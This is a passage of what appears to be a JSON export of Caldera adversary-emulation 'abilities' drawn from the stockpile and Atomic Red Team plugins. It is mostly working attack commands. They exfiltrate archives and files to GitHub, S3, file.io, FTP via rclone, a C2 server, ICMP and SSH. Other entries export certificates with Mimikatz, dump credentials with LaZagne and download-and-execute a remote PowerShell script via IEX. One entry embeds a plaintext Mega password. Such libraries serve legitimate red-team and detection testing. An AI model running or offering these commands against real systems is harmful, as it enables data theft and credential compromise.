Authorization = 'Basic {0}' -f $basetoken;\n};\n$file = (Get-Item #{host.dir.compress});\n$RemoteName = \"$(Get-Date -Format yyyymmddhhmmss)-exfil-#{paw}-$($file.name)\";\n$uri = \"https://api.github.com/repos/\" + $GHUser + \"/\" + $GHRepo + \"/contents/\" + $RemoteName;\n\n$FileBytes = Get-Content -Path $file.FullName -Encoding Byte;\n$Base64EncodedFileBytes = [System.Convert]::ToBase64String($FileBytes);\n$Body = @{\n    path = $RemoteName;\n    branch = $GHBranch;\n    content = $Base64EncodedFileBytes;\n    encoding = 'base64';\n    message = \"Committed \" + $RemoteName;\n} | ConvertTo-Json;\ntry {\n  $content = Invoke-RestMethod -Headers $Headers -Uri $uri -Body $Body -Method Put -ErrorAction SilentlyContinue;\n} catch {\n  if ($PSItem -notmatch \"but expected\") { $PSItem; }\n}", "language": null, "name": "pwsh", "variations": [], "uploads": []}], "technique_name": "Exfiltration to Code Repository", "ability_id": "4a1120a5-971c-457f-bb07-60641b4723fd", "technique_id": "T1567.001", "tactic": "exfiltration", "requirements": [{"relationship_match": [{"source": "host.dir.compress"}], "module": "plugins.stockpile.app.requirements.paw_provenance"}], "name": "Exfil Compressed Archive to Github Repository", "plugin": "stockpile"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Exfiltrate the compressed archive to the provided S3 bucket using the AWS CLI. It is assumed that the user\ncredentials configured with AWS CLI have the proper permissions to write to the target S3 bucket.\n", "repeatable": false, "privilege": "", "buckets": ["exfiltration"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.stockpile.app.parsers.acrn", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "exfil.done"}]}], "cleanup": ["LocalFile='#{host.dir.compress}';\nRemoteName=\"exfil-#{paw}-$(basename $LocalFile)\";\naws s3 rm s3://#{s3.source.name}/$RemoteName;"], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "LocalFile='#{host.dir.compress}';\nRemoteName=\"exfil-#{paw}-$(basename $LocalFile)\";\naws s3 cp #{host.dir.compress} s3://#{s3.source.name}/$RemoteName;", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["$SourceFile = (Get-Item #{host.dir.compress});\n$RemoteName = \"exfil-#{paw}-$($SourceFile.name)\";\naws s3 rm s3://#{s3.source.name}/$RemoteName;"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "$SourceFile = (Get-Item #{host.dir.compress});\n$RemoteName = \"exfil-#{paw}-$($SourceFile.name)\";\naws s3 cp #{host.dir.compress} s3://#{s3.source.name}/$RemoteName;", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Exfiltration to Cloud Storage", "ability_id": "e7bf5dc7-62e4-48b2-acf8-abaf8734c19c", "technique_id": "T1567.002", "tactic": "exfiltration", "requirements": [{"relationship_match": [{"source": "host.dir.compress"}], "module": "plugins.stockpile.app.requirements.paw_provenance"}], "name": "Exfil Compressed Archive to S3 via AWS CLI", "plugin": "stockpile"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Use the AWS SDK for GoLang to upload the compressed archive to the provided S3 bucket.\nIt is assumed that the current user credentials have the proper permissions to write to the target S3 bucket.\nRequires the agent to be compiled with the native_aws extension.\nTimeout set to 45 seconds.\n", "repeatable": false, "privilege": "", "buckets": ["exfiltration"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.stockpile.app.parsers.acrn", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "exfil.done"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "s3upload \"#{host.dir.compress}\" \"#{s3.source.region}\" \"#{s3.source.name}\" \"aws-#{paw}-compressed\" 45s", "language": null, "name": "native", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "s3upload \"#{host.dir.compress}\" \"#{s3.source.region}\" \"#{s3.source.name}\" \"aws-#{paw}-compressed\" 45s", "language": null, "name": "native", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "s3upload \"#{host.dir.compress}\" \"#{s3.source.region}\" \"#{s3.source.name}\" \"aws-#{paw}-compressed\" 45s", "language": null, "name": "native", "variations": [], "uploads": []}], "technique_name": "Exfiltration to Cloud Storage", "ability_id": "dd4d3d6f-be0a-4d80-ada2-0b7f3228d2dc", "technique_id": "T1567.002", "tactic": "exfiltration", "requirements": [{"relationship_match": [{"source": "host.dir.compress"}], "module": "plugins.stockpile.app.requirements.paw_provenance"}], "name": "Exfil Compressed Archive to S3 via Golang", "plugin": "stockpile"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "This ability will exfiltrate all files in a set staged directory to a repository in GitHub.\n", "repeatable": false, "privilege": "", "buckets": ["exfiltration"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "GHUser=\"#{github.user.name}\";\nGHRepo=\"#{github.repository.name}\";\nGHPAT=\"#{github.access.token}\";\nGHBranch='#{github.repository.branch}';\nLocalDirectory=#{host.dir.staged};\nHeader=\"Authorization: token $GHPAT\";\n\nfor file in $LocalDirectory/*.*; do\n  TempName=$(echo $file | sed \"s/ /-/g\")\n\tRemoteName=\"$(date '+%Y%m%d%H%M%S')-exfil-#{paw}-$(basename \"$TempName\")\";\n\techo \"{\\\"message\\\":\\\"Committed $(basename $TempName) at: $(date)\\\", \\\"branch\\\":\\\"$GHBranch\\\", \\\"content\\\":\\\"\" >/tmp/b64;\n  base64 -w 0 \"$file\" >>/tmp/b64;\n  echo \"\\\"}\" >>/tmp/b64;\n\tcontent=$(curl -s -X PUT -H \"Accept: application/vnd.github.v3+json\" -H \"$Header\" https://api.github.com/repos/$GHUser/$GHRepo/contents/$RemoteName -d @/tmp/b64);\n  rm /tmp/b64;\ndone;", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.stockpile.app.parsers.acrn", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "exfil.done"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "$GHUser = \"#{github.user.name}\";\n$GHRepo = \"#{github.repository.name}\";\n$GHPAT = \"#{github.access.token}\";\n$GHBranch = '#{github.repository.branch}';\n$LocalDirectory = \"#{host.dir.staged}\";\n$token = $GHUser + \":\" + $GHPAT;\n$basetoken = [System.Convert]::ToBase64String([char[]]$token);\n$Headers = @{\n    Authorization = 'Basic {0}' -f $basetoken;\n};\n\n$Files = Get-ChildItem $LocalDirectory;\nforeach ($file in $Files){\n    $RemoteName = \"$(Get-Date -Format yyyymmddhhmmss)-exfil-#{paw}-$($file.name)\";\n    $uri = \"https://api.github.com/repos/\" + $GHUser + \"/\" + $GHRepo + \"/contents/\" + $RemoteName;\n    $FileBytes = Get-Content -Path $file.FullName -Encoding Byte;\n    $Base64EncodedFileBytes = [System.Convert]::ToBase64String($FileBytes);\n    $Body = @{\n        path = $file.Name;\n        branch = $GHBranch;\n        content = $Base64EncodedFileBytes;\n        encoding = 'base64';\n        message = \"Committed \" + $file.name + \" at: \" + (Get-Date);\n    } | ConvertTo-Json;\n    try {\n        $content = Invoke-RestMethod -Headers $Headers -Uri $uri -Body $Body -Method Put -ErrorAction SilentlyContinue;\n    } catch {\n        if ($PSItem -notmatch \"but expected\") { $PSItem; }\n        else { $content = Invoke-RestMethod -Headers $Headers -Uri $uri -Body $Body -Method Put -ErrorAction SilentlyContinue; }\n    }\n};", "language": null, "name": "psh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "$GHUser = \"#{github.user.name}\";\n$GHRepo = \"#{github.repository.name}\";\n$GHPAT = \"#{github.access.token}\";\n$GHBranch = '#{github.repository.branch}';\n$LocalDirectory = \"#{host.dir.staged}\";\n$token = $GHUser + \":\" + $GHPAT;\n$basetoken = [System.Convert]::ToBase64String([char[]]$token);\n$Headers = @{\n    Authorization = 'Basic {0}' -f $basetoken;\n};\n\n$Files = Get-ChildItem $LocalDirectory;\nforeach ($file in $Files){\n    $RemoteName = \"$(Get-Date -Format yyyymmddhhmmss)-exfil-#{paw}-$($file.name)\";\n    $uri = \"https://api.github.com/repos/\" + $GHUser + \"/\" + $GHRepo + \"/contents/\" + $RemoteName;\n    $FileBytes = Get-Content -Path $file.FullName -Encoding Byte;\n    $Base64EncodedFileBytes = [System.Convert]::ToBase64String($FileBytes);\n    $Body = @{\n        path = $file.Name;\n        branch = $GHBranch;\n        content = $Base64EncodedFileBytes;\n        encoding = 'base64';\n        message = \"Committed \" + $file.name + \" at: \" + (Get-Date);\n    } | ConvertTo-Json;\n    try {\n        $content = Invoke-RestMethod -Headers $Headers -Uri $uri -Body $Body -Method Put -ErrorAction SilentlyContinue;\n    } catch {\n        if ($PSItem -notmatch \"but expected\") { $PSItem; }\n        else { $content = Invoke-RestMethod -Headers $Headers -Uri $uri -Body $Body -Method Put -ErrorAction SilentlyContinue; }\n    }\n};", "language": null, "name": "pwsh", "variations": [], "uploads": []}], "technique_name": "Exfiltration to Code Repository", "ability_id": "a201bec2-a193-4b58-bf0e-57fa621da474", "technique_id": "T1567.001", "tactic": "exfiltration", "requirements": [{"relationship_match": [{"source": "host.dir.staged"}], "module": "plugins.stockpile.app.requirements.paw_provenance"}], "name": "Exfil Directory Files to GitHub", "plugin": "stockpile"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Exfil the staged directory", "repeatable": false, "privilege": "", "buckets": ["exfiltration"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "curl -F \"data=@#{host.dir.compress}\" --header \"X-Request-ID: `hostname`-#{paw}\" #{server}/file/upload", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.stockpile.app.parsers.acrn", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "exfil.done"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "curl -F \"data=@#{host.dir.compress}\" --header \"X-Request-ID: `hostname`-#{paw}\" #{server}/file/upload", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "$ErrorActionPreference = 'Stop';\n$fieldName = \"#{host.dir.compress}\";\n$filePath = \"#{host.dir.compress}\";\n$url = \"#{server}/file/upload\";\n\nAdd-Type -AssemblyName 'System.Net.Http';\n\n$client = New-Object System.Net.Http.HttpClient;\n$content = New-Object System.Net.Http.MultipartFormDataContent;\n$fileStream = [System.IO.File]::OpenRead($filePath);\n$fileName = [System.IO.Path]::GetFileName($filePath);\n$fileContent = New-Object System.Net.Http.StreamContent($fileStream);\n$content.Add($fileContent, $fieldName, $fileName);\n$client.DefaultRequestHeaders.Add(\"X-Request-Id\", $env:COMPUTERNAME + '-#{paw}');\n$client.DefaultRequestHeaders.Add(\"User-Agent\",\"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36\");\n\n$result = $client.PostAsync($url, $content).Result;\n$result.EnsureSuccessStatusCode();", "language": null, "name": "psh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "$ErrorActionPreference = 'Stop';\n$fieldName = \"#{host.dir.compress}\";\n$filePath = \"#{host.dir.compress}\";\n$url = \"#{server}/file/upload\";\n\nAdd-Type -AssemblyName 'System.Net.Http';\n\n$client = New-Object System.Net.Http.HttpClient;\n$content = New-Object System.Net.Http.MultipartFormDataContent;\n$fileStream = [System.IO.File]::OpenRead($filePath);\n$fileName = [System.IO.Path]::GetFileName($filePath);\n$fileContent = New-Object System.Net.Http.StreamContent($fileStream);\n$content.Add($fileContent, $fieldName, $fileName);\n$client.DefaultRequestHeaders.Add(\"X-Request-Id\", $env:COMPUTERNAME + '-#{paw}');\n$client.DefaultRequestHeaders.Add(\"User-Agent\",\"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36\");\n\n$result = $client.PostAsync($url, $content).Result;\n$result.EnsureSuccessStatusCode();", "language": null, "name": "pwsh", "variations": [], "uploads": []}], "technique_name": "Exfiltration Over C2 Channel", "ability_id": "ea713bc4-63f0-491c-9a6f-0b01d560b87e", "technique_id": "T1041", "tactic": "exfiltration", "requirements": [{"relationship_match": [{"source": "host.dir.compress"}], "module": "plugins.stockpile.app.requirements.paw_provenance"}], "name": "Exfil staged directory", "plugin": "stockpile"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Exfiltrate data HTTPS using curl to file share site file.io\n", "repeatable": false, "privilege": "", "buckets": ["exfiltration"], "access": {}, "executors": [{"additional_info": {}, "payloads": ["3945c9_artifact"], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "curl -F 'file=@3945c9_artifact' -F 'maxDownloads=1' -F 'autoDelete=true' https://file.io/", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": ["3945c9_artifact"], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "curl -F 'file=@3945c9_artifact' -F 'maxDownloads=1' -F 'autoDelete=true' https://file.io/", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Exfiltration Over Alternative Protocol - Exfiltration Over Asymmetric Encrypted Non-C2 Protocol", "ability_id": "1ecd8f81d020145064af72dbcd47110a", "technique_id": "T1048.002", "tactic": "exfiltration", "requirements": [], "name": "Exfiltrate data HTTPS using curl linux", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Exfiltrate data HTTPS using curl to file share site file.io\n", "repeatable": false, "privilege": "", "buckets": ["exfiltration"], "access": {}, "executors": [{"additional_info": {}, "payloads": ["3945c9_artifact"], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "C:\\Windows\\System32\\Curl.exe -F 'file=@3945c9_artifact' -F 'maxDownloads=1' -F 'autoDelete=true' https://file.io/", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Exfiltration Over Alternative Protocol - Exfiltration Over Asymmetric Encrypted Non-C2 Protocol", "ability_id": "36f50411a52fddf639b03b14918d988f", "technique_id": "T1048.002", "tactic": "exfiltration", "requirements": [], "name": "Exfiltrate data HTTPS using curl windows", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "This test uses rclone to exfiltrate data to a remote cloud storage instance. (Mega)\nSee https://thedfirreport.com/2022/06/16/sans-ransomware-summit-2022-can-you-detect-this/\n", "repeatable": false, "privilege": "", "buckets": ["exfiltration"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["cd $env:temp\\T1567.002\\rclone-v*\\; .\\rclone.exe purge T1567002:test; .\\rclone.exe config delete T1567002:; Remove-Item $env:appdata\\rclone -recurse -force -erroraction silentlycontinue; cd c:\\; Remove-Item $env:temp\\rclone.zip; Remove-Item $env:temp\\T1567.002 -recurse -force"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "New-Item $env:appdata\\rclone -ItemType directory; New-Item $env:appdata\\rclone\\rclone.conf; cd $env:temp\\T1567.002\\rclone-v*\\; .\\rclone.exe config create T1567002 mega; set-Content $env:appdata\\rclone\\rclone.conf \"[T1567002] `n type = mega `n user = atomictesting@outlook.com `n pass = vmcjt1A_LEMKEXXy0CKFoiFCEztpFLcZVNinHA\"; .\\rclone.exe copy --max-size 1700k $env:temp\\T1567.002 T1567002:test -v", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Exfiltration Over Web Service: Exfiltration to Cloud Storage", "ability_id": "447a2314183957f35cccd808182c0997", "technique_id": "T1567.002", "tactic": "exfiltration", "requirements": [], "name": "Exfiltrate data with rclone to cloud Storage - Mega (Windows)", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Rclone may be used by an adversary to exfiltrate data to a publicly hosted FTP server.\n[Reference](https://thedfirreport.com/2021/03/29/sodinokibi-aka-revil-ransomware/)", "repeatable": false, "privilege": "", "buckets": ["exfiltration"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "$rclone_bin = Get-ChildItem C:\\Users\\Public\\Downloads\\ -Recurse -Include \"rclone.exe\" | Select-Object -ExpandProperty FullName; $exfil_pack = Get-ChildItem C:\\Users\\Public\\Downloads\\ -Recurse -Include \"exfil.zip\" | Select-Object -ExpandProperty FullName; &$rclone_bin config create ftpserver \"ftp\" \"host\"; &$rclone_bin copy --max-age 2y $exfil_pack ftpserver --bwlimit 2M -q --ignore-existing --auto-confirm --multi-thread-streams 12 --transfers 12 -P --ftp-no-check-certificate", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol", "ability_id": "37d984b74e1b2bd258f1cf6ed623b058", "technique_id": "T1048.003", "tactic": "exfiltration", "requirements": [], "name": "Exfiltration Over Alternative Protocol - FTP - Rclone", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Exfiltration of specified file over HTTP.\nUpon successful execution, powershell will invoke web request using POST method to exfiltrate notepad.exe to a remote address (default http://127.0.0.1). Results will be via stdout.\n", "repeatable": false, "privilege": "", "buckets": ["exfiltration"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "$content = Get-Content C:\\Windows\\System32\\notepad.exe; Invoke-WebRequest -Uri http://127.0.0.1 -Method POST -Body $content", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol", "ability_id": "548a620bf3463f72a42937faf7614935", "technique_id": "T1048.003", "tactic": "exfiltration", "requirements": [], "name": "Exfiltration Over Alternative Protocol - HTTP", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Exfiltration of specified file over ICMP protocol.\n\nUpon successful execution, powershell will utilize ping (icmp) to exfiltrate notepad.exe to a remote address (default 127.0.0.1). Results will be via stdout.\n", "repeatable": false, "privilege": "", "buckets": ["exfiltration"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "$ping = New-Object System.Net.Networkinformation.ping; foreach($Data in Get-Content -Path C:\\Windows\\System32\\notepad.exe -Encoding Byte -ReadCount 1024) { $ping.Send(\"127.0.0.1\", 1500, $Data) }", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol", "ability_id": "6baab84fe7a52dd5c4ede612fc0d255f", "technique_id": "T1048.003", "tactic": "exfiltration", "requirements": [], "name": "Exfiltration Over Alternative Protocol - ICMP", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Exfiltration of specified file over SMTP.\nUpon successful execution, powershell will send an email with attached file to exfiltrateto a remote address. Results will be via stdout.\n", "repeatable": false, "privilege": "", "buckets": ["exfiltration"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "Send-MailMessage -From", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol", "ability_id": "e4316d90e4dbc776f4e2bae602109d83", "technique_id": "T1048.003", "tactic": "exfiltration", "requirements": [], "name": "Exfiltration Over Alternative Protocol - SMTP", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Input a domain and test Exfiltration over SSH\n\nLocal to Remote\n\nUpon successful execution, tar will compress /Users/* directory and password protect the file modification of `Users.tar.gz.enc` as output.\n", "repeatable": false, "privilege": "", "buckets": ["exfiltration"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "tar czpf - /Users/* | openssl des3 -salt -pass atomic | ssh atomic@target.example.com 'cat > /Users.tar.gz.enc'", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "tar czpf - /Users/* | openssl des3 -salt -pass atomic | ssh atomic@target.example.com 'cat > /Users.tar.gz.enc'", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Exfiltration Over Alternative Protocol", "ability_id": "7db784562afbea0265fcafc4243b66de", "technique_id": "T1048", "tactic": "exfiltration", "requirements": [], "name": "Exfiltration Over Alternative Protocol - SSH", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Input a domain and test Exfiltration over SSH\n\nRemote to Local\n\nUpon successful execution, sh will spawn ssh contacting a remote domain (default: target.example.com) writing a tar.gz file.\n", "repeatable": false, "privilege": "", "buckets": ["exfiltration"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "ssh target.example.com \"(cd /etc && tar -zcvf - *)\" > ./etc.tar.gz", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "ssh target.example.com \"(cd /etc && tar -zcvf - *)\" > ./etc.tar.gz", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Exfiltration Over Alternative Protocol", "ability_id": "5ac7f6ec1898d8d408f9cdc687262cc7", "technique_id": "T1048", "tactic": "exfiltration", "requirements": [], "name": "Exfiltration Over Alternative Protocol - SSH", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "The following Atomic test will utilize Mimikatz to extract the certificates from the local system My store. This tool is available at https://github.com/gentilkiwi/mimikatz and can be obtained using the get-prereq_commands.\nA successful attempt will stdout the certificates and write multiple .pfx and .der files to disk.\n", "repeatable": false, "privilege": "", "buckets": ["credential-access"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "PathToAtomicsFolder\\T1003.001\\bin\\x64\\mimikatz.exe \"crypto::certificates /systemstore:local_machine /store:my /export\"  exit", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Unsecured Credentials: Private Keys", "ability_id": "fd3ee5ac9978245dae1e7563a1c6b13d", "technique_id": "T1552.004", "tactic": "credential-access", "requirements": [], "name": "Export Certificates with Mimikatz", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Creates a Root certificate and exports it with Export-Certificate PowerShell Cmdlet.\nUpon a successful attempt, this will write a pfx to disk and utilize the Cmdlet Export-Certificate.\n", "repeatable": false, "privilege": "", "buckets": ["credential-access"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["try {;    $cert = Import-Certificate -FilePath $env:Temp\\AtomicRedTeam.cer -CertStoreLocation Cert:\\LocalMachine\\My -ErrorAction Ignore;    Get-ChildItem Cert:\\LocalMachine\\My\\$($cert.Thumbprint) -ErrorAction Ignore | Remove-Item -ErrorAction Ignore;    Get-ChildItem Cert:\\LocalMachine\\Root\\$($cert.Thumbprint) -ErrorAction Ignore | Remove-Item -ErrorAction Ignore; }; catch { }"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "$cert = New-SelfSignedCertificate -DnsName atomicredteam.com -CertStoreLocation cert:\\LocalMachine\\My; Set-Location Cert:\\LocalMachine\\My; Export-Certificate -Type CERT -Cert  Cert:\\LocalMachine\\My\\$($cert.Thumbprint) -FilePath $env:Temp\\AtomicRedTeam.cer", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Unsecured Credentials: Private Keys", "ability_id": "995eb25ee0b9d036110318311ca2527b", "technique_id": "T1552.004", "tactic": "credential-access", "requirements": [], "name": "Export Root Certificate with Export-Certificate", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Creates a Root certificate and exports it with Export-PFXCertificate PowerShell Cmdlet.\nUpon a successful attempt, this will write a pfx to disk and utilize the Cmdlet Export-PFXCertificate.\n", "repeatable": false, "privilege": "", "buckets": ["credential-access"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["try {; $cert = Import-Certificate -FilePath $env:Temp\\atomicredteam.pfx -CertStoreLocation Cert:\\LocalMachine\\My; Get-ChildItem Cert:\\LocalMachine\\My\\$($cert.Thumbprint) -ErrorAction Ignore | Remove-Item -ErrorAction Ignore; Get-ChildItem Cert:\\LocalMachine\\Root\\$($cert.Thumbprint) -ErrorAction Ignore | Remove-Item -ErrorAction Ignore; } catch { }"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "$mypwd = ConvertTo-SecureString -String \"AtomicRedTeam\" -Force -AsPlainText; $cert = New-SelfSignedCertificate -DnsName atomicredteam.com -CertStoreLocation cert:\\LocalMachine\\My; Set-Location Cert:\\LocalMachine\\My; Get-ChildItem -Path $cert.Thumbprint | Export-PfxCertificate -FilePath $env:Temp\\atomicredteam.pfx -Password $mypwd", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Unsecured Credentials: Private Keys", "ability_id": "f7257d271a176f7c609b4a33513d2eef", "technique_id": "T1552.004", "tactic": "credential-access", "requirements": [], "name": "Export Root Certificate with Export-PFXCertificate", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "[LaZagne Source](https://github.com/AlessandroZ/LaZagne)\n", "repeatable": false, "privilege": "", "buckets": ["credential-access"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "python2 laZagne.py all", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Unsecured Credentials: Credentials In Files", "ability_id": "32b3ff317f207b221b14283a30f48007", "technique_id": "T1552.001", "tactic": "credential-access", "requirements": [], "name": "Extract Browser and System credentials with LaZagne", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "This module attempts to emulate malware authors utilizing well known techniques to extract data from memory/binary files. To do this\nwe first create a string in memory then pull out the pointer to that string. Finally, it uses this pointer to copy the contents of that\nmemory location to a file stored in the $env:TEMP\\atomic_t1059_005_test_output.bin.\n", "repeatable": false, "privilege": "", "buckets": ["execution"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["Remove-Item \"$env:TEMP\\atomic_t1059_005_test_output.bin\" -ErrorAction Ignore"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing) ; Invoke-Maldoc -macroFile \"PathToAtomicsFolder\\T1059.005\\src\\T1059_005-macrocode.txt\" -officeProduct \"Word\" -sub \"Extract\"", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Command and Scripting Interpreter: Visual Basic", "ability_id": "42302f7d89c15f8070f83e743771d567", "technique_id": "T1059.005", "tactic": "execution", "requirements": [], "name": "Extract Memory via VBA", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "This module will extract the credentials found within the Windows credential manager and dump\nthem to 